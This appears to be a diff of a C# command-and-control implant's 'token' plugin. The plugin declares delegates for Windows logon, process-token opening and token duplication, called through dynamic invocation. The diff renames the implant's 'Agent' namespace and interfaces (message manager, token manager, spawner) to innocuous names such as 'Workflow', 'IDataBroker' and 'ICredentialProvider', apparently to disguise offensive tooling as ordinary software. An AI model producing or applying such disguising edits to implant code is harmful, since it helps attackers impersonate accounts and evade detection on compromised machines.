@@ -1,6 +1,6 @@
-﻿using Agent.Interfaces;
-using Agent.Models;
-using Agent.Utilities;
+using Workflow.Contracts;
+using Workflow.Models;
+using Workflow.Utilities;
 using Microsoft.Win32.SafeHandles;
 using System.Runtime.InteropServices;
 using System.Text.Json;
@@ -8,18 +8,18 @@ using System.Diagnostics;
 using System.Security.Principal;
 using Invoker.Dynamic;
 
-namespace Agent
+namespace Workflow
 {
-    public class Plugin : IPlugin
+    public class Plugin : IModule
     {
         public string Name => "token";
-        private IMessageManager messageManager { get; set; }
-        private ITokenManager tokenManager { get; set; }
+        private IDataBroker messageManager { get; set; }
+        private ICredentialProvider tokenManager { get; set; }
         private delegate bool logonUsrDelegate(string lpszUserName, string lpszDomain, string lpszPassword, Native.LogonType dwLogonType, Native.LogonProvider dwLogonProvider, out SafeAccessTokenHandle phToken, out object obj, out object obj2, out object obj3, out object obj4);
         private delegate bool openProcTokenDelegate(IntPtr ProcessHandle, uint desiredAccess, out SafeAccessTokenHandle TokenHandle);
         private delegate bool dupeTokenDelegate(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, Native.TOKEN_TYPE TokenType, out SafeAccessTokenHandle phNewToken);
         private delegate bool closeHandleDelegate(IntPtr hObject);
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
+        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
         {
             this.messageManager = messageManager;
             this.tokenManager = tokenManager;
